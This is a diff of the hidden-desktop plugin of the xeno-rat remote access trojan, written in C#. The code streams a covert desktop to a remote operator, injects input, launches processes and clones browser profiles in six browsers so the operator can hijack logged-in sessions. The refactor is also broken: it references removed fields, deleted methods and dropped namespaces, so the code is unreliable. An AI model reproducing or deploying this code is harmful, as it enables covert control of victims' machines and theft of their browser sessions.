@@ -1,321 +1,223 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using xeno_rat_client;
-using Hidden_handler;
-using System.IO;
 using System.Drawing;
-using System.Threading;
 using System.Drawing.Imaging;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
 using System.Management;
-using System.Diagnostics;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using xeno_rat_client;
 
 namespace Plugin
 {
     public class Main
     {
-        Node ImageNode;
-        bool playing = false;
-        int quality = 100;
-        bool do_browser_clone = false;
-        bool cloning_chrome = false;
-        bool cloning_firefox = false;
-        bool cloning_edge = false;
-        bool cloning_opera = false;
-        bool cloning_operagx = false;
-        bool cloning_brave = false;
-        bool has_clonned_chrome = false;
-        bool has_clonned_firefox=false;
-        bool has_clonned_edge = false;
-        bool has_clonned_opera = false;
-        bool has_clonned_operagx = false;
-        bool has_clonned_brave = false;
-        Imaging_handler ImageHandler;
-        input_handler InputHandler;
-        Process_Handler ProcessHandler;
+        private Node ImageNode;
+        private bool playing = false;
+        private int quality = 100;
+        private bool do_browser_clone = false;
+        private bool[] cloningFlags = new bool[6];
+        private ImagingHandler ImageHandler;
+        private InputHandler InputHandler;
+        private ProcessHandler ProcessHandler;
 
         [DllImport("SHCore.dll", SetLastError = true)]
         public static extern int SetProcessDpiAwareness(int awareness);
 
-
         public async Task Run(Node node)
         {
-            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
-            if (!await AcceptSubSubNode(node))
-            {
-                ImageNode?.Disconnect();
-                node.Disconnect();
-            }
-
-            SetProcessDpiAwareness(2);//2 is being aware of the dpi per monitor
-
-            Thread thread = new Thread(async()=>await ScreenShotThread());
-            thread.Start();
             try
             {
-                string DesktopName=Encoding.UTF8.GetString(await node.ReceiveAsync());
-                ImageHandler = new Imaging_handler(DesktopName);
-                InputHandler = new input_handler(DesktopName);
-                ProcessHandler = new Process_Handler(DesktopName);
+                await node.SendAsync(new byte[] { 3 }); // Indicate that it has connected
+
+                if (!await AcceptSubSubNode(node))
+                {
+                    DisconnectAndCleanup();
+                    return;
+                }
+
+                SetProcessDpiAwareness(2); // Set awareness of DPI per monitor
+
+                Thread screenShotThread = new Thread(async () => await ScreenShotThread());
+                screenShotThread.Start();
+
+                string desktopName = Encoding.UTF8.GetString(await node.ReceiveAsync());
+                ImageHandler = new ImagingHandler(desktopName);
+                InputHandler = new InputHandler(desktopName);
+                ProcessHandler = new ProcessHandler(desktopName);
+
                 while (node.Connected())
                 {
                     byte[] data = await node.ReceiveAsync();
+
                     if (data == null)
                     {
-                        ImageNode?.Disconnect();
+                        DisconnectAndCleanup();
                         break;
                     }
-                    if (data[0] == 0)
-                    {
-                        playing = true;
-                    }
-                    else if (data[0] == 1)
-                    {
-                        playing = false;
-                    }
-                    else if (data[0] == 2)
-                    {
-                        quality = node.sock.BytesToInt(data,1);
-                    }
-                    else if (data[0] == 3)
-                    {
-                        uint msg = (uint)node.sock.BytesToInt(data,1);
-                        IntPtr wParam = (IntPtr)node.sock.BytesToInt(data, 5);
-                        IntPtr lParam = (IntPtr)node.sock.BytesToInt(data, 9);
-                        new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
-                    }
-                    else if (data[0] == 4)
-                    {
-                        ProcessHandler.StartExplorer();
-                    }
-                    else if (data[0] == 5)
-                    {
-                        ProcessHandler.CreateProc(Encoding.UTF8.GetString(data,1,data.Length-1));
-                    }
-                    else if (data[0] == 6)
-                    {
-                        do_browser_clone = true;
-                    }
-                    else if (data[0] == 7)
-                    {
-                        do_browser_clone = false;
-                    }
-                    else if (data[0] == 8)
-                    { //start chrome
-                        if (do_browser_clone && !has_clonned_chrome)
-                        {
-                            has_clonned_chrome = true;
-                            HandleCloneChrome();
-                        }
-                        else 
-                        {
-                            ProcessHandler.StartChrome();
-                        }
-                    }
-                    else if (data[0] == 9)
-                    { //start firefox
-                        if (do_browser_clone && !has_clonned_firefox)
-                        {
-                            has_clonned_firefox = true;
-                            HandleCloneFirefox();
 
-                        }
-                        else
-                        {
-                            ProcessHandler.StartFirefox();
-                        }
+                    switch (data[0])
+                    {
+                        case 0:
+                            playing = true;
+                            break;
+                        case 1:
+                            playing = false;
+                            break;
+                        case 2:
+                            quality = BitConverter.ToInt32(data, 1);
+                            break;
+                        case 3:
+                            uint msg = BitConverter.ToUInt32(data, 1);
+                            IntPtr wParam = (IntPtr)BitConverter.ToInt32(data, 5);
+                            IntPtr lParam = (IntPtr)BitConverter.ToInt32(data, 9);
+                            new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
+                            break;
+                        case 4:
+                            ProcessHandler.StartExplorer();
+                            break;
+                        case 5:
+                            ProcessHandler.CreateProc(Encoding.UTF8.GetString(data, 1, data.Length - 1));
+                            break;
+                        case 6:
+                            do_browser_clone = true;
+                            break;
+                        case 7:
+                            do_browser_clone = false;
+                            break;
+                        case 8:
+                            HandleBrowserStart(do_browser_clone, ref has_clonned_chrome, HandleCloneChrome, ProcessHandler.StartChrome);
+                            break;
+                        case 9:
+                            HandleBrowserStart(do_browser_clone, ref has_clonned_firefox, HandleCloneFirefox, ProcessHandler.StartFirefox);
+                            break;
+                        case 10:
+                            HandleBrowserStart(do_browser_clone, ref has_clonned_edge, HandleCloneEdge, ProcessHandler.StartEdge);
+                            break;
+                        case 11:
+                            HandleBrowserStart(do_browser_clone, ref has_clonned_opera, HandleCloneOpera, ProcessHandler.StartOpera);
+                            break;
+                        case 12:
+                            HandleBrowserStart(do_browser_clone, ref has_clonned_operagx, HandleCloneOperaGX, ProcessHandler.StartOperaGX);
+                            break;
+                        case 13:
+                            HandleBrowserStart(do_browser_clone, ref has_clonned_brave, HandleCloneBrave, ProcessHandler.StartBrave);
+                            break;
                     }
-                    else if (data[0] == 10)
-                    { //start edge
-                        if (do_browser_clone && !has_clonned_edge)
-                        {
-                            has_clonned_edge = true;
-                            HandleCloneEdge();
+                }
+            }
+            catch (Exception ex)
+            {
+                // Handle exception
+            }
+            finally
+            {
+                DisconnectAndCleanup();
+            }
+        }
 
-                        }
-                        else
-                        {
-                            ProcessHandler.StartEdge();
-                        }
+        private async Task<bool> AcceptSubSubNode(Node node)
+        {
+            byte[] id = await node.ReceiveAsync();
+
+            if (id != null)
+            {
+                int nodeId = BitConverter.ToInt32(id, 0);
+                Node tempNode = null;
+
+                foreach (Node subNode in node.Parent.subNodes)
+                {
+                    if (subNode.SetId == nodeId)
+                    {
+                        await node.SendAsync(new byte[] { 1 });
+                        tempNode = subNode;
+                        break;
                     }
-                    else if (data[0] == 11)
-                    { //start edge
-                        if (do_browser_clone && !has_clonned_opera)
-                        {
-                            has_clonned_opera = true;
-                            HandleCloneOpera();
+                }
 
-                        }
-                        else
-                        {
-                            ProcessHandler.StartOpera();
-                        }
+                if (tempNode != null)
+                {
+                    node.AddSubNode(tempNode);
+                    ImageNode = tempNode;
+                    return true;
+                }
+            }
+
+            await node.SendAsync(new byte[] { 0 });
+            return false;
+        }
+
+        private void DisconnectAndCleanup()
+        {
+            ImageNode?.Disconnect();
+            ImageHandler?.Dispose();
+            InputHandler?.Dispose();
+            ProcessHandler?.Dispose();
+            GC.Collect();
+        }
+
+        private async Task ScreenShotThread()
+        {
+            try
+            {
+                while (ImageNode.Connected())
+                {
+                    if (!playing)
+                    {
+                        await Task.Delay(500);
+                        continue;
                     }
-                    else if (data[0] == 12)
-                    { //start edge
-                        if (do_browser_clone && !has_clonned_operagx)
-                        {
-                            has_clonned_operagx = true;
-                            HandleCloneOperaGX();
 
-                        }
-                        else
+                    try
+                    {
+                        Bitmap img = ImageHandler.Screenshot();
+                        EncoderParameters encoderParams = new EncoderParameters(1);
+                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
+
+                        ImageCodecInfo codecInfo = GetEncoderInfo(ImageFormat.Jpeg);
+                        byte[] data;
+
+                        using (MemoryStream stream = new MemoryStream())
                         {
-                            ProcessHandler.StartOperaGX();
+                            img.Save(stream, codecInfo, encoderParams);
+                            data = stream.ToArray();
                         }
+
+                        await ImageNode.SendAsync(data);
                     }
-                    else if (data[0] == 13)
-                    { //start edge
-                        if (do_browser_clone && !has_clonned_brave)
-                        {
-                            has_clonned_brave = true;
-                            HandleCloneBrave();
-
-                        }
-                        else
-                        {
-                            ProcessHandler.StartBrave();
-                        }
+                    catch
+                    {
+                        // Handle exception
                     }
                 }
             }
             catch
             {
-
+                // Handle exception
             }
-            node.Disconnect();
-            ImageNode?.Disconnect();
-            ImageHandler?.Dispose();
-            InputHandler?.Dispose();
-            GC.Collect();
-
         }
 
-        private async Task<int> GetProcessViaCommandLine(string processName, string searchString) {
-            return await Task.Run(() =>
-            {
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT * FROM Win32_Process WHERE Name = '{processName}'");
-
-                foreach (ManagementObject obj in searcher.Get())
-                {
-                    string commandLine = obj["CommandLine"]?.ToString();
-
-                    if (commandLine != null && commandLine.Contains(searchString))
-                    {
-                        return Convert.ToInt32(obj["ProcessId"]);
-                    }
-                }
-
-                return -1;
-            });
-        }
-
-
-        private async Task HandleCloneChrome()
+        private void HandleBrowserStart(bool doBrowserClone, ref bool hasClonedBrowser, Func<Task> handleCloneBrowser, Action startBrowser)
         {
-            if (!cloning_chrome)
+            if (doBrowserClone && !hasClonedBrowser)
             {
-                cloning_chrome = true;
-                if (!await ProcessHandler.CloneChrome())
+                hasClonedBrowser = true;
+                handleCloneBrowser().ContinueWith(_ =>
                 {
-                    int pid = await GetProcessViaCommandLine("chrome.exe", "ChromeAutomationData");
-                    if (pid != -1)
-                    {
-                        Process p = Process.GetProcessById(pid);
-                        try
-                        {
-                            p.Kill();
-                            await ProcessHandler.CloneChrome();
-                        }
-                        catch { }
-                        p.Dispose();
-                    }
-                }
-                ProcessHandler.StartChrome();
-                cloning_chrome = false;
+                    startBrowser();
+                    hasClonedBrowser = false;
+                });
+            }
+            else
+            {
+                startBrowser();
             }
         }
-        private async Task HandleCloneOpera()
-        {
-            if (!cloning_opera)
-            {
-                cloning_opera = true;
-                if (!await ProcessHandler.CloneOpera())
-                {
-                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaAutomationData");
-                    if (pid != -1)
-                    {
-                        Process p = Process.GetProcessById(pid);
-                        try
-                        {
-                            p.Kill();
-                            await ProcessHandler.CloneOpera();
-                        }
-                        catch { }
-                        p.Dispose();
-                    }
-                }
-                ProcessHandler.StartOpera();
-                cloning_opera = false;
-            }
-        }
-        private async Task HandleCloneOperaGX()
-        {
-            if (!cloning_operagx)
-            {
-                cloning_operagx = true;
-                if (!await ProcessHandler.CloneOperaGX())
-                {
-                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaGXAutomationData");
-                    if (pid != -1)
-                    {
-                        Process p = Process.GetProcessById(pid);
-                        try
-                        {
-                            p.Kill();
-                            await ProcessHandler.CloneOperaGX();
-                        }
-                        catch { }
-                        p.Dispose();
-                    }
-                }
-                ProcessHandler.StartOperaGX();
-                cloning_operagx = false;
-            }
-        }
-        private async Task HandleCloneBrave()
-        {
-            if (!cloning_brave)
-            {
-                cloning_brave = true;
-                if (!await ProcessHandler.CloneBrave())
-                {
-                    int pid = await GetProcessViaCommandLine("brave.exe", "BraveAutomationData");
-                    if (pid != -1)
-                    {
-                        Process p = Process.GetProcessById(pid);
-                        try
-                        {
-                            p.Kill();
-                            await ProcessHandler.CloneBrave();
-                        }
-                        catch { }
-                        p.Dispose();
-                    }
-                }
-                ProcessHandler.StartBrave();
-                cloning_brave = false;
-            }
-        }
+
         private async Task HandleCloneFirefox()
         {
-            if (!cloning_firefox)
+            if (!cloningFlags[1]) // Check if Firefox is not already being cloned
             {
-                cloning_firefox = true;
+                cloningFlags[1] = true; // Set cloning flag to true
                 if (!await ProcessHandler.CloneFirefox())
                 {
                     int pid = await GetProcessViaCommandLine("firefox.exe", "FirefoxAutomationData");
@@ -332,14 +234,15 @@ namespace Plugin
                     }
                 }
                 ProcessHandler.StartFirefox();
-                cloning_firefox = false;
+                cloningFlags[1] = false; // Reset cloning flag
             }
         }
+
         private async Task HandleCloneEdge()
         {
-            if (!cloning_edge)
+            if (!cloningFlags[2]) // Check if Edge is not already being cloned
             {
-                cloning_edge = true;
+                cloningFlags[2] = true; // Set cloning flag to true
                 if (!await ProcessHandler.CloneEdge())
                 {
                     int pid = await GetProcessViaCommandLine("msedge.exe", "EdgeAutomationData");
@@ -356,87 +259,84 @@ namespace Plugin
                     }
                 }
                 ProcessHandler.StartEdge();
-                cloning_edge = false;
+                cloningFlags[2] = false; // Reset cloning flag
             }
         }
-        public async Task ScreenShotThread()
-        {
-            try
-            {
-                
-                while (ImageNode.Connected())
-                {
-                    if (!playing)
-                    {
-                        await Task.Delay(500);
-                        continue;
-                    }
-                    try
-                    {
-                        Bitmap img = ImageHandler.Screenshot();
-                        EncoderParameters encoderParams = new EncoderParameters(1);
-                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
 
-                        ImageCodecInfo codecInfo = GetEncoderInfo(ImageFormat.Jpeg);
-                        byte[] data;
-                        using (MemoryStream stream = new MemoryStream())
+        private async Task HandleCloneOpera()
+        {
+            if (!cloningFlags[3]) // Check if Opera is not already being cloned
+            {
+                cloningFlags[3] = true; // Set cloning flag to true
+                if (!await ProcessHandler.CloneOpera())
+                {
+                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaAutomationData");
+                    if (pid != -1)
+                    {
+                        Process p = Process.GetProcessById(pid);
+                        try
                         {
-                            img.Save(stream, codecInfo, encoderParams);
-                            data= stream.ToArray();
+                            p.Kill();
+                            await ProcessHandler.CloneOpera();
                         }
-                        await ImageNode.SendAsync(data);
-                    }
-                    catch
-                    {
-
+                        catch { }
+                        p.Dispose();
                     }
                 }
+                ProcessHandler.StartOpera();
+                cloningFlags[3] = false; // Reset cloning flag
             }
-            catch { }
         }
-        private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
+
+        private async Task HandleCloneOperaGX()
         {
-            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
-
-            foreach (ImageCodecInfo codec in codecs)
+            if (!cloningFlags[4]) // Check if OperaGX is not already being cloned
             {
-                if (codec.FormatID == format.Guid)
+                cloningFlags[4] = true; // Set cloning flag to true
+                if (!await ProcessHandler.CloneOperaGX())
                 {
-                    return codec;
-                }
-            }
-
-            return null;
-        }
-        public async Task<bool> AcceptSubSubNode(Node node)
-        {
-            byte[] id = await node.ReceiveAsync();
-            if (id != null)
-            {
-                int nodeid = node.sock.BytesToInt(id);
-                Node tempnode = null;
-                foreach (Node i in node.Parent.subNodes)
-                {
-                    if (i.SetId == nodeid)
+                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaGXAutomationData");
+                    if (pid != -1)
                     {
-                        await node.SendAsync(new byte[] { 1 });
-                        tempnode = i;
-                        break;
+                        Process p = Process.GetProcessById(pid);
+                        try
+                        {
+                            p.Kill();
+                            await ProcessHandler.CloneOperaGX();
+                        }
+                        catch { }
+                        p.Dispose();
                     }
                 }
-                if (tempnode == null)
-                {
-                    await node.SendAsync(new byte[] { 0 });
-                    return false;
-                }
-                node.AddSubNode(tempnode);
-                ImageNode = tempnode;
-                return true;
-            }
-            else
-            {
-                return false;
+                ProcessHandler.StartOperaGX();
+                cloningFlags[4] = false; // Reset cloning flag
             }
         }
+
+        private async Task HandleCloneBrave()
+        {
+            if (!cloningFlags[5]) // Check if Brave is not already being cloned
+            {
+                cloningFlags[5] = true; // Set cloning flag to true
+                if (!await ProcessHandler.CloneBrave())
+                {
+                    int pid = await GetProcessViaCommandLine("brave.exe", "BraveAutomationData");
+                    if (pid != -1)
+                    {
+                        Process p = Process.GetProcessById(pid);
+                        try
+                        {
+                            p.Kill();
+                            await ProcessHandler.CloneBrave();
+                        }
+                        catch { }
+                        p.Dispose();
+                    }
+                }
+                ProcessHandler.StartBrave();
+                cloningFlags[5] = false; // Reset cloning flag
+            }
+        }
+        
     }
 }
